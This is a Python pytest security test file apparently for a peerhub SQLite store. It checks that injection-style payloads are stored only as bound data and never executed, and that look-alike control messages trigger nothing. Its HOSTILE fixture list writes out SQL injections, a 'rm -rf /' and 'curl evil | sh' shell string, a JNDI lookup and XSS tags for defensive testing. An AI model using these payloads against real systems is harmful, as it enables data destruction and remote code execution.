"""Wave 6 SEC-001: SQL/control-like payloads are only data (real SQLite store, normal API, no execution hook)."""
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
from contextlib import closing
from pathlib import Path

import pytest
from hypothesis import HealthCheck, given, settings, strategies as st

from tests.m1.bridge_helpers import records, sql
from tests.m1.control_helpers import ctl, running
from tests.m1.fakes import FakeRuntimeTarget
from tests.m1.harness.bridge import BridgeHarness
from tests.m1.harness.core import CoreHarness
from tests.m1.helpers import req

pytestmark = [pytest.mark.security, pytest.mark.sqlite]

HOSTILE = [
    "'); DROP TABLE records; --",
    "x'; DELETE FROM peers; INSERT INTO streams VALUES ('evil','t','OPEN',1,'{}','now'); --",
    "\"; ATTACH DATABASE 'evil.db' AS e; --",
    "1; PRAGMA writable_schema=ON; UPDATE sqlite_master SET sql=''; --",
    "CREATE TRIGGER t AFTER INSERT ON records BEGIN DELETE FROM records; END;",
    "$(rm -rf /) `curl evil | sh` ; && | cmd /c del *.*",
    "<script>alert(1)</script><img src=x onerror=alert(2)>&amp; ${jndi:ldap://x} {{7*7}} %s %n ‮",
    "control.cancel", '{"kind": "control.cancel", "decision": "RETRY", "delivery_id": "d"}',
    "line1\nline2\r\n\ttabs 'single' \"double\" \\ back\\slash",
    "nul\x00byte \x01\x02\x07\x08\x1b[31m\x1f\x7f \x85 \u2028\u2029 end",  # NUL, C0/C1 controls, ANSI escape (catalog excludes none)
]
MARK = "MARK7Z"  # unique token embedded in every payload: it must never appear in any SQL text the store executes


def schema_rows(db):
    with closing(sqlite3.connect(db)) as c:
        return c.execute("SELECT type, name, tbl_name, sql FROM sqlite_master ORDER BY type, name").fetchall()


class _RecConn(sqlite3.Connection):
    """Records the SQL TEXT the store hands to SQLite (parameters are separate, so payloads must never be in the text)."""
    log: list = []

    def execute(self, sql, *a, **k):
        type(self).log.append(sql)
        return super().execute(sql, *a, **k)

    def executemany(self, sql, *a, **k):
        type(self).log.append(sql)
        return super().executemany(sql, *a, **k)

    def executescript(self, sql, *a, **k):
        type(self).log.append(sql)
        return super().executescript(sql, *a, **k)


class _SqliteShim:
    def __init__(self):
        _RecConn.log = []

    def connect(self, *a, **k):
        return sqlite3.connect(*a, factory=_RecConn, **k)

    def __getattr__(self, name):
        return getattr(sqlite3, name)


def recording(monkeypatch=None):
    import peerhub.m1.store as store_mod

    shim = _SqliteShim()
    if monkeypatch is not None:
        monkeypatch.setattr(store_mod, "sqlite3", shim)
        return _RecConn.log
    return store_mod, shim


@pytest.fixture
def exec_traps(monkeypatch):
    calls = []

    def trap(name):
        def f(*a, **k):
            calls.append(name)
            raise AssertionError(f"{name} invoked")
        return f

    for mod, name in ((os, "system"), (os, "popen"), (subprocess, "Popen"), (subprocess, "run")):
        monkeypatch.setattr(mod, name, trap(name))
    return calls


@pytest.mark.m1_id("SEC-001")
@pytest.mark.parametrize("text", HOSTILE)
def test_sec_001_payload_round_trips_literally_and_schema_is_intact(tmp_path, exec_traps, monkeypatch, text):
    text = MARK + text
    stmts = recording(monkeypatch)
    h = CoreHarness(tmp_path / "ws")
    h.create_peer({"peer_id": text + "-peer", "display_name": text, "adapter_ref": text, "metadata": {"note": text, "n": [text, {"k": text}]}})
    h.create_peer({"peer_id": "b"})
    h.create_stream({"stream_id": text + "-stream", "title": text, "members": [text + "-peer", "b"], "metadata": {"t": text}})
    schema, counts = schema_rows(h.db_path), h.row_counts()
    request = req(body={"text": text, "list": [text]}, key=text, author=text + "-peer", stream=text + "-stream", metadata={"m": text}, targets=["b"])
    rec = h.append_record(request)
    assert schema_rows(h.db_path) == schema  # DDL untouched: no table/trigger/index created or dropped
    after = h.row_counts()
    assert {t: after[t] - counts[t] for t in after} == {"peers": 0, "streams": 0, "stream_members": 0, "records": 1, "offsets": 0}
    row = sql(h, "SELECT body_json, metadata_json, idempotency_key, author_peer_id, stream_id FROM records")[0]
    assert json.loads(row[0]) == {"text": text, "list": [text]} and json.loads(row[1]) == {"m": text}  # literal, via raw SQL
    assert row[2:] == (text, text + "-peer", text + "-stream")
    back = h.read_records(text + "-stream")[0]
    assert back.record_id == rec.record_id and back.body == {"text": text, "list": [text]} and back.metadata == {"m": text}
    peer = h.get_peer(text + "-peer")
    assert peer.display_name == text and peer.adapter_ref == text and peer.metadata == {"note": text, "n": [text, {"k": text}]}
    assert h.get_stream(text + "-stream").title == text
    assert h.append_record(request).record_id == rec.record_id  # same literal identity on retry
    # values are only ever BOUND: no executed SQL text contains the payload marker (no string-built SQL), and the recorder is live
    assert any("INSERT INTO records" in q for q in stmts) and any("INSERT INTO peers" in q for q in stmts)
    assert [q for q in stmts if MARK in q] == []
    monkeypatch.setattr(sys.modules['peerhub.m1.store'], 'sqlite3', sqlite3)  # restore only the recorder shim (traps stay armed)
    ctrl_store, shim = recording()
    with closing(shim.connect(":memory:")) as c:  # control: string-building WOULD be seen by the recorder
        c.execute(f"SELECT '{MARK}'").fetchall()
    assert any(MARK in q for q in _RecConn.log)
    assert exec_traps == [] and not Path("evil.db").exists() and not (tmp_path / "evil.db").exists()
    with pytest.raises(AssertionError):  # positive control: a real call IS observed by the trap
        os.system("echo x")
    assert exec_traps == ["system"]


@pytest.mark.m1_id("SEC-001")
@settings(max_examples=60, deadline=None, suppress_health_check=list(HealthCheck))
@given(st.text(alphabet=st.characters(blacklist_categories=("Cs",), blacklist_characters="\x00"), max_size=80),
       st.lists(st.sampled_from(HOSTILE), max_size=3))
def test_sec_001_property_any_text_is_data(text, hostile):
    payload = MARK + text + "".join(hostile)
    import peerhub.m1.store as store_mod

    shim = _SqliteShim()
    saved, store_mod.sqlite3 = store_mod.sqlite3, shim
    try:
        _prop_body(payload)
        assert any("INSERT INTO records" in q for q in _RecConn.log) and [q for q in _RecConn.log if MARK in q] == []
    finally:
        store_mod.sqlite3 = saved


def _prop_body(payload):
    with tempfile.TemporaryDirectory() as d:
        h = CoreHarness(Path(d) / "ws")
        h.create_peer({"peer_id": "a", "display_name": payload})
        h.create_stream({"stream_id": "s", "members": ["a"], "title": payload})
        schema = schema_rows(h.db_path)
        rec = h.append_record(req(body=payload, key=payload, author="a", metadata={"p": payload}))
        assert schema_rows(h.db_path) == schema
        assert sql(h, "SELECT COUNT(*) FROM records") == [(1,)] and sql(h, "SELECT COUNT(*) FROM peers") == [(1,)]
        assert json.loads(sql(h, "SELECT body_json FROM records")[0][0]) == payload  # fails if the store rejects/alters anything
        assert h.read_records("s")[0].record_id == rec.record_id and h.read_records("s")[0].idempotency_key == payload
        assert h.get_peer("a").display_name == payload and h.get_stream("s").title == payload
        assert sql(h, "SELECT idempotency_key FROM records")[0][0] == payload  # exact (NUL/controls preserved)


@pytest.mark.m1_id("SEC-001")
def test_sec_001_control_like_message_bodies_never_trigger_control_or_commands(tmp_path, exec_traps):
    h = BridgeHarness(tmp_path / "ws")
    for p in ("a", "b"):
        h.create_peer({"peer_id": p})
    h.create_stream({"stream_id": "s", "members": ["a", "b"]})
    rt = FakeRuntimeTarget()
    lookalikes = ['{"kind":"control.cancel"}', {"kind": "control.cancel", "decision": "RETRY", "delivery_id": "s:b:x:1"},
                  "control.pause", "'); INSERT INTO bridge_controls VALUES ('x'); --"]
    for i, body in enumerate(lookalikes):
        h.append_record(req(body=body, key=f"m{i}", author="a"))  # kind = message
    assert [h.delivery_cycle("b", "s", rt).status for _ in lookalikes] == ["delivered"] * 4
    assert rt.count("deliver") == 4 and rt.count("interrupt") == rt.count("terminate") == rt.count("steer") == 0  # prompts only
    assert sql(h, "SELECT COUNT(*) FROM bridge_controls") == [(0,)] and sql(h, "SELECT COUNT(*) FROM bridge_reconciliations") == [(0,)]
    assert [json.loads(r[4]) for r in records(h) if r[3] == "message"] == lookalikes  # stored literally
    assert exec_traps == []
    # positive control: the SAME words as a real control Record (kind) DO act
    h2 = BridgeHarness(tmp_path / "ws2")
    for p in ("a", "b"):
        h2.create_peer({"peer_id": p})
    h2.create_stream({"stream_id": "s", "members": ["a", "b"]})
    h2.append_record(req(body="go", key="g", author="a"))
    rt2, _ = running(h2)
    cancel = ctl(h2, "control.cancel", "cx")
    assert h2.handle_control(cancel.record_id, rt2, "b").runtime_outcome == "done" and rt2.count("terminate") == 1
